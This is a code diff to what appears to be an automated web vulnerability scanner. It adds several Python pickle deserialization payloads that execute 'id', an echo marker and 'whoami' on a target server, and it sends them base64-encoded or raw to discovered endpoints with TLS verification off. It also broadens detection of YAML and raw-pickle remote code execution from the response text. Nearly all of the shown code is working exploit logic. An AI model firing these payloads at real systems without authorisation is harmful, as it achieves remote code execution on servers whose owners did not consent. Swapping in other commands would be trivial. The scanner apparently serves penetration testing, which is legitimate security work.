@@ -29,12 +29,24 @@
   _safe_pickle = base64.b64encode(pickle.dumps(_SafeProbe())).decode()
   _safe_pickle_list = base64.b64encode(pickle.dumps([1, 2, 3])).decode()
 
-  # Dangerous pickle (for CONFIRMED endpoints only — executes `id`)
-  class _RCEProbe:
+  # Dangerous pickle probes — multiple output formats to catch different responses
+  class _RCEProbe_id:
       def __reduce__(self):
           import os
           return (os.popen, ('id',))
-  _rce_pickle = base64.b64encode(pickle.dumps(_RCEProbe())).decode()
+  _rce_pickle = base64.b64encode(pickle.dumps(_RCEProbe_id())).decode()
+
+  class _RCEProbe_echo:
+      def __reduce__(self):
+          import os
+          return (os.system, ('echo PICKLE_RCE_CONFIRMED_12345',))
+  _rce_pickle_echo = base64.b64encode(pickle.dumps(_RCEProbe_echo())).decode()
+
+  class _RCEProbe_whoami:
+      def __reduce__(self):
+          import subprocess
+          return (subprocess.check_output, (['whoami'],))
+  _rce_pickle_whoami = base64.b64encode(pickle.dumps(_RCEProbe_whoami())).decode()
 
   # YAML unsafe load payloads
   YAML_PAYLOADS = [
@@ -84,18 +96,41 @@
               if r.status_code == 200 and 'error' not in body_lower[:200]:
                   print(f"  [WARN] {endpoint} param={param} accepted pickle data (HTTP 200, no error)")
 
-                  # Confirmed — now test RCE payload
-                  time.sleep(0.3)
-                  try:
-                      r2 = session.post(endpoint, data={param: _rce_pickle}, timeout=10, verify=False)
-                  except Exception:
+                  # Confirmed — now test RCE payloads (try multiple)
+                  for rce_label, rce_b64 in [('id', _rce_pickle), ('echo', _rce_pickle_echo), ('whoami', _rce_pickle_whoami)]:
+                      time.sleep(0.3)
+                      try:
+                          r2 = session.post(endpoint, data={param: rce_b64}, timeout=10, verify=False)
+                      except Exception:
+                          continue
+                      body2 = r2.text
+                      # Check for ANY sign of command execution
+                      rce_confirmed = False
+                      evidence = ''
+                      if re.search(r'uid=\d+', body2):
+                          rce_confirmed = True
+                          evidence = re.search(r'uid=.{0,50}', body2).group()
+                      elif 'PICKLE_RCE_CONFIRMED_12345' in body2:
+                          rce_confirmed = True
+                          evidence = 'Echo marker found in response'
+                      elif re.search(r'(root|www-data|nobody|[a-z_][a-z0-9_-]*)\n', body2):
+                          rce_confirmed = True
+                          evidence = f'whoami output: {body2.strip()[:100]}'
+                      elif r2.status_code == 200 and body2 != r.text and len(body2.strip()) > 0:
+                          # Response changed after RCE payload — possible blind RCE
+                          if 'error' not in body2.lower()[:200] and 'traceback' not in body2.lower()[:200]:
+                              print(f"  [WARN] Response changed with RCE payload ({rce_label}) — possible blind RCE")
+                              print(f"  Safe response: {r.text[:150]}")
+                              print(f"  RCE response:  {body2[:150]}")
+                      if rce_confirmed:
+                          print(f"[CRITICAL] Pickle RCE CONFIRMED: {endpoint} param={param} (via {rce_label})")
+                          print(f"  Evidence: {evidence}")
+                          deser_findings.append({'url': endpoint, 'param': param, 'type': 'pickle_rce',
+                                                 'evidence': body2[:300]})
+                          break
+                  else:
                       continue
-                  if re.search(r'uid=\d+\([a-z_]+\)', r2.text):
-                      print(f"[CRITICAL] Pickle RCE CONFIRMED: {endpoint} param={param}")
-                      print(f"  Evidence: {re.search(r'uid=.{{0,30}}', r2.text).group()}")
-                      deser_findings.append({'url': endpoint, 'param': param, 'type': 'pickle_rce',
-                                             'evidence': r2.text[:300]})
-                      break
+                  break
               elif 'unpickl' in body_lower or 'deserializ' in body_lower or 'pickle' in body_lower:
                   print(f"  [INFO] {endpoint} mentions pickle/deserialization in error — endpoint processes serialized data")
 
@@ -110,9 +145,10 @@
                           r = session.post(endpoint, data=yaml_payload, headers={'Content-Type': content_type}, timeout=10, verify=False)
                   except Exception:
                       continue
-                  if re.search(r'uid=\d+\([a-z_]+\)', r.text):
+                  if re.search(r'uid=\d+', r.text) or 'PICKLE_RCE_CONFIRMED' in r.text:
                       print(f"[CRITICAL] YAML deserialization RCE: {endpoint}")
                       print(f"  Payload: {yaml_payload}")
+                      print(f"  Evidence: {r.text[:200]}")
                       deser_findings.append({'url': endpoint, 'type': 'yaml_rce',
                                              'payload': yaml_payload, 'evidence': r.text[:300]})
                       break
@@ -120,14 +156,17 @@
   # Test 3: Raw body POST (some endpoints accept raw pickle in body)
   for endpoint in sorted(deser_candidates):
       time.sleep(0.3)
-      try:
-          r = session.post(endpoint, data=base64.b64decode(_rce_pickle),
-                           headers={'Content-Type': 'application/octet-stream'}, timeout=10, verify=False)
-          if re.search(r'uid=\d+\([a-z_]+\)', r.text):
-              print(f"[CRITICAL] Raw pickle RCE: {endpoint}")
-              deser_findings.append({'url': endpoint, 'type': 'raw_pickle_rce', 'evidence': r.text[:300]})
-      except Exception:
-          pass
+      for rce_label, rce_b64 in [('id', _rce_pickle), ('echo', _rce_pickle_echo)]:
+          try:
+              r = session.post(endpoint, data=base64.b64decode(rce_b64),
+                               headers={'Content-Type': 'application/octet-stream'}, timeout=10, verify=False)
+              if re.search(r'uid=\d+', r.text) or 'PICKLE_RCE_CONFIRMED_12345' in r.text:
+                  print(f"[CRITICAL] Raw pickle RCE: {endpoint} (via {rce_label})")
+                  print(f"  Evidence: {r.text[:200]}")
+                  deser_findings.append({'url': endpoint, 'type': 'raw_pickle_rce', 'evidence': r.text[:300]})
+                  break
+          except Exception:
+              pass
 
   if deser_findings:
       _G.setdefault('FINDINGS', [])
